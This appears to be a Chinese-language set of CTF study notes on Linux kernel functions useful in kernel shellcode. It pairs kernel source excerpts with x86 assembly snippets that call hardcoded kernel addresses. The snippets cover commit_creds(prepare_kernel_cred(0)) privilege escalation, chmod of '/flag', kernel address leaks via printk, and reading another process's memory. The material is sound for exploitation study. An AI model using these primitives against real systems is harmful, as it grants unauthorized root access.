<https://elixir.bootlin.com/linux/>

- 在 `.h` 头文件中包含大量注释说明 

### filp_open & filp_close - 打开并返回/关闭文件指针

```c
struct file *filp_open(const char *filename, int flags, umode_t mode)

int filp_close(struct file *filp, fl_owner_t id)
```

### kernel_read & kernel_write - 读写文件指针

```c
// pos 偏移量指针
ssize_t kernel_read(struct file *file, void *buf, size_t count, loff_t *pos)

ssize_t kernel_write(struct file *file, const void *buf, size_t count,
			    loff_t *pos)
```

### _copy_from_user & _copy_to_user - 内存复制

```c
unsigned long _copy_from_user(void *to, const void __user *from, unsigned long n)

unsigned long _copy_to_user(void __user *to, const void *from, unsigned long n)
```

`_copy_from_user` 与 `_copy_to_user` 对 `__user` 指针指向的内存进行复制，指针可为用户态 buf （write）或内核对 fd 创建的临时缓冲区（sendfile）

### proc_create & proc_remove - 创建移除接口

```c
struct proc_dir_entry *proc_create(const char *name, umode_t mode,
				   struct proc_dir_entry *parent,
				   const struct proc_ops *proc_ops)

void proc_remove(struct proc_dir_entry *de)
```

### printk - 打印一条内核消息

```c
// fmt：格式化字符串
#define printk(fmt, ...) printk_index_wrap(_printk, fmt, ##__VA_ARGS__)

asmlinkage __visible int _printk(const char *fmt, ...)
{
	va_list args;
	int r;

	va_start(args, fmt);
	r = vprintk(fmt, args);
	va_end(args);

	return r;
}
```

所有 `printk()` 消息都会打印到内核日志缓冲区，这是一个通过 `/dev/kmsg` 导出到用户空间的环形缓冲区。通常使用 `dmesg` 来读取它。

使用可变长度参数，当控制格式化字符串而写入大量 `%px` 尝试打印地址时，printk 将打印出寄存器参数 + 内核栈参数。
- 溢出的内核栈参数将泄露内核地址

```asm
; rdi 格式化字符串设置为 %s 字符串型
; rsi 设置为栈，对应之前分配栈后读取到栈的指令

	lea rdi, [rip + fmt]
	mov rsi, rsp
	mov rax, 0xffffffff810b69a9
	call rax

fmt:
	.asciz "%s"
```

### prepare_kernel_cred - 为内核服务准备一组凭证

```c
/**
 * 
 * @daemon: 用作参考的用户空间守护进程
 *
 * 为内核服务准备一组凭证。随后可用此凭证覆盖任务的自身凭证
 *
 * @daemon 用于提供基础凭证，其安全数据源自该基础凭证；如果该参数为 "&init_task"，则凭证将被设置为 0（无用户组）、拥有全部能力且无密钥。
 *
 * 如有需要，调用方之后可以更改这些控制项。
 *
 * 返回新的凭证，若内存不足则返回 NULL。
 */
struct cred *prepare_kernel_cred(struct task_struct *daemon)

// 新版 6.x
	if (WARN_ON_ONCE(!daemon))
			return NULL;
// 旧版 5.x
	if (daemon)
		old = get_task_cred(daemon);
	else
		old = get_cred(&init_cred);
```

参数 daemon：
- 新版 当参数为 0 触发警告并返回 NULL
- 旧版 参数 0 == NULL == "&init_task"，设置 root 权限

	```asm
	xor rdi, rdi
	mov rax, 0xffffffff81089660
	call rax
	```

### commit_creds - 将新凭证安装到当前任务

```c
/**
 * @new: 要分配的凭证
 *
 * 为当前任务安装一组新凭证，使用 RCU 替换旧凭证集。同时更新目标凭证和主观凭证指针。如果主观凭证处于被覆盖状态，则不能调用此函数。
 *
 * 此函数会消耗调用方对新凭证的引用。
 *
 * 始终返回 0，因此该函数可在 sys_setgid() 等函数的末尾被尾调用。
 */
int commit_creds(struct cred *new)
```

```asm
// 在执行 prepare_kernel_cred 后，使用返回的凭证
mov rdi, rax
mov rax, 0xffffffff81089310
call rax
```


### ioctl - 处理 IOCTL 请求

```c
/*
 * 处理 IOCTL 请求
 *
 * 参数
 *
 * 	tty	指向 tty 实例数据的指针
 * 	cmd	IOCTL 命令码
 * 	arg	命令参数/上下文
 *
 * 成功返回 0，否则返回错误码
 */
static int ioctl(struct tty_struct *tty,
		 unsigned int cmd, unsigned long arg)
```

```asm
ioctl(challenge_fd, 0x539, NULL);
; rax, syscall 16
; rdi, fd
; rsi, cmd
; rdx, arg

mov rdi, 3
mov rsi, 0x539
mov rdx, 0
mov rax, 16
syscall
```

### __x86_indirect_thunk_REG - 寄存器间接跳转

使用宏批量生成形如 `__x86_indirect_thunk_rax` `__x86_indirect_thunk_rbx` 的间接跳转符号
```c
	.section .text..__x86.indirect_thunk

; 宏 POLINE
; 跳转到标签 .Ldo_rop_\@
.macro POLINE reg
	ANNOTATE_INTRA_FUNCTION_CALL
	call    .Ldo_rop_\@
	int3
; 使用寄存器的值覆盖栈顶储存的值
.Ldo_rop_\@:
	mov     %\reg, (%_ASM_SP)
	UNWIND_HINT_FUNC
.endm

; 宏 RETPOLINE
; 调用 POLINE 使用寄存器值覆盖栈顶值后 ret 返回
; 相当于 ret reg
.macro RETPOLINE reg
	POLINE \reg
	RET
.endm

; 宏 THUNK
.macro THUNK reg

	.align RETPOLINE_THUNK_SIZE
// SYM_INNER_LABEL 定义 __x86_indirect_thunk_REG 为全局符号 SYM_L_GLOBAL
SYM_INNER_LABEL(__x86_indirect_thunk_\reg, SYM_L_GLOBAL)
	UNWIND_HINT_UNDEFINED
	ANNOTATE_NOENDBR

	// ALTERNATIVE_2 替代指令序列
	// 序列1 使用之前定义的宏 RETPOLINE 设置栈顶并 ret
	// 序列2/3 jmp REG
	ALTERNATIVE_2 __stringify(RETPOLINE \reg), \
		      __stringify(lfence; ANNOTATE_RETPOLINE_SAFE; jmp *%\reg; int3), X86_FEATURE_RETPOLINE_LFENCE, \
		      __stringify(ANNOTATE_RETPOLINE_SAFE; jmp *%\reg), ALT_NOT(X86_FEATURE_RETPOLINE)
SYM_PIC_ALIAS(__x86_indirect_thunk_\reg)

.endm

// EXPORT_SYMBOL 导出符号
#define __EXPORT_THUNK(sym)	_ASM_NOKPROBE(sym); EXPORT_SYMBOL(sym)

	.align RETPOLINE_THUNK_SIZE
// 代码区域开始
SYM_CODE_START(__x86_indirect_thunk_array)

// 对所有通用寄存器执行 GEN(reg)，此处批量生成 __x86_indirect_thunk_REG 跳转符号
// https://elixir.bootlin.com/linux/v6.19.9/source/arch/x86/include/asm/GEN-for-each-reg.h
#define GEN(reg) THUNK reg
#include <asm/GEN-for-each-reg.h>
#undef GEN

	.align RETPOLINE_THUNK_SIZE
// 代码区域结束
SYM_CODE_END(__x86_indirect_thunk_array)
```

### kern_path - 设置文件的路径结构体

```c
int kern_path(const char *name, unsigned int flags, struct path *path)
```

```asm
; 分配 16 字节的栈空间，并将路径结构写入 rsp
	sub rsp, 16
	lea rdi, [rip + name]
	mov rsi, 0
	mov rdx, rsp
	mov rax, 0xffffffff811dcd90
	call rax

name:
    .asciz "/flag"
```

### chmod_common - 修改文件权限，需路径结构体

```c
int chmod_common(const struct path *path, umode_t mode)
```

`path` 为路径结构体 `struct path *`
- 调用 kern_path 获得，或 filp_open 得到文件结构后偏移到对应字段

```asm
; kern_path 将路径结构写入栈，此处使用栈指针

mov rdi, rsp
mov rsi, 4
mov rax, 0xffffffff811c6c70
call rax
```

### do_fchmodat - 修改文件权限，需用户态文件名buf

```c
static int do_fchmodat(int dfd, const char __user *filename, umode_t mode,
		       unsigned int flags)
```

`filename` 为用户态地址 `__user *`

`dfd` 目录文件描述符，沿用 AT_FDCWD == -100 对应的当前工作目录
- 最终使用 `path_init` 解析路径字符串，即使设置 `dfd` 为当前工作目录，也可在 `filename` 使用绝对路径字符串

```asm
	mov rdi, -100
	lea rsi, [rip + filename]
	mov rdx, 0x4
	mov rcx, 0
	mov rax, 0xffffffff811c8110
	call rax

filename:
    .asciz "/flag"
```


### path_init - 解析路径字符串为相对/绝对路径

```c
static const char *path_init(struct nameidata *nd, unsigned flags){
	/* Absolute pathname -- fetch the root (LOOKUP_IN_ROOT uses nd->dfd). */
	if (*s == '/' && likely(!(flags & LOOKUP_IN_ROOT))) {
		error = nd_jump_root(nd);
		if (unlikely(error))
			return ERR_PTR(error);
		return s;
	}

	/* Relative pathname -- get the starting-point it is relative to. */
	if (nd->dfd == AT_FDCWD) {
	}
}
```

### noop_ret - 空操作函数

```c
static unsigned int noop_ret(struct irq_data *data)
```

可用来添加到 shellcode 作为 gdb 调试用的符号断点

```asm
mov rax, 0xffffffff810bc8e0
call rax
```

### run_cmd

```c
static int run_cmd(const char *cmd)
{
	char **argv;
	static char *envp[] = {
		"HOME=/",
		"PATH=/sbin:/bin:/usr/sbin:/usr/bin",
		NULL
	};
	int ret;
	argv = argv_split(GFP_KERNEL, cmd, NULL);
	if (argv) {
		ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
		argv_free(argv);
	} else {
		ret = -ENOMEM;
	}

	return ret;
}
```

使用绝对路径

新旧版均默认拥有 root 凭证

调用链：
```c
static kernel_cap_t usermodehelper_bset = CAP_FULL_SET;
static kernel_cap_t usermodehelper_inheritable = CAP_FULL_SET;

- run_cmd(const char *cmd) 
	- call_usermodehelper_setup(path, argv, envp, gfp_mask,
					 init=NULL, cleanup=NULL, data=NULL);
		sub_info->init = init;
		- INIT_WORK(&sub_info->work, call_usermodehelper_exec_work);
			- call_usermodehelper_exec_sync(sub_info);
				// 旧版 5.x
				- kernel_thread(call_usermodehelper_exec_async...);
				// 新版 6.x
				- user_mode_thread(call_usermodehelper_exec_async...);
					- prepare_kernel_cred(current);
					- new->cap_bset = cap_intersect(usermodehelper_bset, new->cap_bset);
					- new->cap_inheritable = cap_intersect(usermodehelper_inheritable, new->cap_inheritable);
					- sub_info->init()
					- commit_creds(new);
						- do_execve_file(sub_info->file,
					sub_info->argv, sub_info->envp);

	- call_usermodehelper_exec(info, wait);
```
- INIT_WORK 创造的工作队列线程拥有 root 凭证
- 之后使用 current 创建并应用的凭证继承 root 权限
- 之后使用 cap_intersect 默认不消减 root 权限
- sub_info->init 默认不消减 root 权限


### access_process_vm - 访问另一个进程的地址空间

```c
/*
 * 源/目标缓冲区必须是内核空间，
 */
int access_process_vm(struct task_struct *tsk, unsigned long addr,
		void *buf, int len, unsigned int gup_flags)
{
	struct mm_struct *mm;
	int ret;

	mm = get_task_mm(tsk);
	if (!mm)
		return 0;

	ret = __access_remote_vm(mm, addr, buf, len, gup_flags);

	mmput(mm);

	return ret;
}
```

tsk 目标进程/线程的任务结构指针 task_struct
addr 目标进程/线程的虚拟地址
buf 内核缓冲区
len 长度


```asm
; access_process_vm(tsk, 0x404040, 内核页/栈地址, 0x100, 0)
; current_task ; c_tsk_ptr = *gs:0x15d00
; current->children ; c_chd_sibling_ptr = c_tsk_ptr + 0x1200
; children tsk ; chd_tsk = *c_chd_sibling_ptr - 0x1216

mov rdi, qword ptr gs:0x15d00  
mov rdi, qword ptr [rdi + 1200]
sub rdi, 1216
mov rsi, 0x404040

sub rsp, 0x100
mov rdx, rsp
mov rcx, 0x100
mov r8, 0
mov rax, 0xffffffff81190040
call rax

add rsp, 0x100
```

### __access_remote_vm - 按照 mm 中给出的，访问另一个进程的地址空间

```c
static int __access_remote_vm(struct mm_struct *mm, unsigned long addr,
			      void *buf, int len, unsigned int gup_flags)
{
	int write = gup_flags & FOLL_WRITE;
	while
		if
		else
			if (write) {
				copy_to_user_page(vma, page, addr,
						  maddr + offset, buf, bytes);
				folio_mark_dirty_lock(folio);
			} else {
				copy_from_user_page(vma, page, addr,
						    buf, maddr + offset, bytes);
			}
}
```

gup_flags 控制读写操作，读时无需置位

### get_user_pages & get_user_pages_remote - 在内存中固定用户页面

```c
/**
 * @start:      起始用户地址
 * @nr_pages:   从起始地址开始固定的页面数
 * @gup_flags:  修改查找行为的标志
 * @pages:      接收被固定页面指针的数组。
 *              长度至少为 nr_pages。如果调用者仅希望确保页面已缺页异常调入，
 *              可传入 NULL。
 *
 * 此函数与 get_user_pages_remote() 相同，只是调用约定较不灵活：
 * 假定操作的内存描述符属于当前任务，并且不允许传递 locked 参数。
 * 显然，这里也不传递 FOLL_REMOTE 标志。
 */
long get_user_pages(unsigned long start, unsigned long nr_pages,
		    unsigned int gup_flags, struct page **pages)

/**
 * @mm:         目标内存描述符的 mm_struct
 * @start:      起始用户地址
 * @nr_pages:   从起始地址开始固定的页面数
 * @gup_flags:  修改查找行为的标志
 * @pages:      接收被固定页面指针的数组。
 *              长度至少为 nr_pages。如果调用者仅希望确保页面已缺页异常调入，
 *              可传入 NULL。
 * @locked:     指向锁标志的指针，指示当前是否持有锁，
 *              以及随后是否可以使用 VM_FAULT_RETRY 功能。
 *              锁必须初始为持有状态。
 */
long get_user_pages_remote(struct mm_struct *mm,
		unsigned long start, unsigned long nr_pages,
		unsigned int gup_flags, struct page **pages,
		int *locked)
```

### alloc_pages - 分配内存页，返回页结构

```c
#define alloc_pages(...)			alloc_hooks(alloc_pages_noprof(__VA_ARGS__))

/**
 * alloc_pages - 分配页面。
 * @gfp: GFP 标志。
 * @order: 要分配的页面数的 2 的幂次。
 *
 * 分配 1 << @order 个连续页面。第一个页面的物理地址是自然对齐的
 * （例如，order-3 分配将按 8 * PAGE_SIZE 字节的倍数对齐）。
 * 当处于进程上下文时，会遵循当前进程的 NUMA 策略。
 *
 * 上下文：可从任何上下文调用，前提是使用了适当的 GFP 标志。
 * 返回值：成功时返回页面，分配失败时返回 NULL。
 */
struct page *alloc_pages_noprof(gfp_t gfp, unsigned int order)
{
	struct page *page = alloc_frozen_pages_noprof(gfp, order);

	if (page)
		set_page_refcounted(page);
	return page;
}
```

返回页结构

### __get_free_pages - 分配内存页，返回页地址

```c
#define __get_free_pages(...)			alloc_hooks(get_free_pages_noprof(__VA_ARGS__))

/*
 * 通用辅助函数。切勿与 __GFP_HIGHMEM 一起使用，因为返回的地址无法表示高端内存页。
 * 如果需要访问高端内存，请使用 alloc_pages，然后通过 kmap 进行映射。
 */
unsigned long get_free_pages_noprof(gfp_t gfp_mask, unsigned int order)
{
	struct page *page;

	page = alloc_pages_noprof(gfp_mask & ~__GFP_HIGHMEM, order);
	if (!page)
		return 0;
	return (unsigned long) page_address(page);
}
```

返回页地址

- 若查找泄露子串时，使用最少的order = 0 对应的1页，并循环查询

```asm
; rdi, gfp_mask, GFP_KERNEL 0xcc0
; rsi, order, 1<<0 *4096, 4096 字节

mov rdi, 0xcc0
mov rsi, 0
mov rax, 0xffffffff811a3000
call rax
```

### gfp

`GFP_KERNEL` 0xcc0

### remap_vmalloc_range - 将 vmalloc 页面映射到用户空间


```c
/**
 * @vma:		要覆盖的 vma（映射 vma 的整个范围）
 * @addr:		vmalloc 内存地址
 * @pgoff:		在 addr 中，映射第一个页面之前要跳过的页面数
 *
 * 返回值：	成功返回 0，失败返回 -Exxx
 *
 * 该函数检查 addr 是否为有效的 vmalloc 区域，并且其大小足够覆盖该 vma。
 * 如果不满足这些条件，将返回失败。
 *
 * 类似于 remap_pfn_range()（参见 mm/memory.c）
 */
int remap_vmalloc_range(struct vm_area_struct *vma, void *addr,
						unsigned long pgoff)
{
	return remap_vmalloc_range_partial(vma, vma->vm_start,
					   addr, pgoff,
					   vma->vm_end - vma->vm_start);
}
```

### kvmalloc_node - 分配物理连续内存

```c
void * kvmalloc_node(size_t size, gfp_t flags, int node)
```

尝试分配物理连续内存，如果失败则回退到非连续内存分配（vmalloc）。

**参数**

*`size_t size`*
请求分配的内存大小。

*`gfp_t flags`*
分配时使用的 GFP 掩码 – 必须与 `GFP_KERNEL` 兼容（是其超集）。

*`int node`*
从哪个 NUMA 节点进行分配。

**描述**

该函数首先尝试使用 `kmalloc` 获取内存，如果分配失败，则回退到 `vmalloc` 分配器。释放此类内存时应使用 `kvfree`。

回收修饰符 – 不支持 `__GFP_NORETRY` 和 `__GFP_NOFAIL`。支持 `__GFP_RETRY_MAYFAIL`，但仅在 `kmalloc` 相较于 `vmalloc` 回退更受青睐时使用，因为 `vmalloc` 存在明显的性能缺陷。

请注意，任何在 `GFP_KERNEL` 之外使用 GFP 标志的情况都需谨慎，以避免回退到 `vmalloc`。

**返回值**

返回指向已分配内存的指针，若分配失败则返回 `NULL`。

### vmalloc_user - 分配已清零的虚拟连续内存以供用户空间使用

```c
void * vmalloc_user(unsigned long size)
```

分配已清零的虚拟连续内存以供用户空间使用。

**参数**

*`unsigned long size`*
分配的内存大小

**描述**

所分配的内存区域会被清零，因此可以映射到用户空间而不会泄漏数据。

**返回值**

返回指向已分配内存的指针，若出错则返回 `NULL`

### find_vpid - 查找并返回 pid 结构指针

```c
/*
 * 在哈希表中查找 PID。必须在持有 tasklist_lock 或 rcu_read_lock() 的情况下调用。
 *
 * find_pid_ns() 在指定的命名空间中查找 pid
 * find_vpid() 通过虚拟 id 查找 pid，即当前命名空间中的 pid
 *
 * 另请参阅 include/linux/sched.h 中定义的 find_task_by_vpid()
 */

struct pid *find_vpid(int nr)
{
	return find_pid_ns(nr, task_active_pid_ns(current));
}
```


### pid_task - 使用 pid 结构指针，返回 task_struct 结构指针

```c
struct task_struct *pid_task(struct pid *pid, enum pid_type type)
{
	struct task_struct *result = NULL;
	if (pid) {
		struct hlist_node *first;
		first = rcu_dereference_check(hlist_first_rcu(&pid->tasks[type]),
					      lockdep_tasklist_lock_is_held());
		if (first)
			result = hlist_entry(first, struct task_struct, pid_links[(type)]);
	}
	return result;
}
```